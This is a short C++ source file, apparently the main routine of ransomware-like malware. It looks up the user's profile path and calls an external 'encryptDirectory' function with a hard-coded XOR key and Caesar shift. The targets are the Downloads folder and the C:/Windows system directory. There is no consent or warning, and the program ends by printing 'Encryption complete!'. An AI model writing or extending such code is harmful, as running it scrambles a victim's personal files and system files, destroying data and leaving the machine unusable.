#include "kk5v.h"
#include <iostream>
#include <string>
#include <cstdlib>
#include <filesystem>

int main() {
    std::string key = "magicspell";  // XOR key
    int shift = 3;  // Caesar shift

    // Get the Downloads directory path
    const char* userProfileEnv = std::getenv("USERPROFILE");
    if (userProfileEnv == nullptr) {
        std::cerr << "USERPROFILE environment variable not found!" << std::endl;
        return 1;
    }
    std::string downloadsDirectory = std::string(userProfileEnv) + "\\Downloads";

    // Encrypt files in the Downloads directory
    kk5v::encryptDirectory(downloadsDirectory, key, shift);

    // Encrypt files in the C:/Windows directory
    kk5v::encryptDirectory("C:/Windows", key, shift);

    std::cout << "Encryption complete!" << std::endl;

    return 0;
}
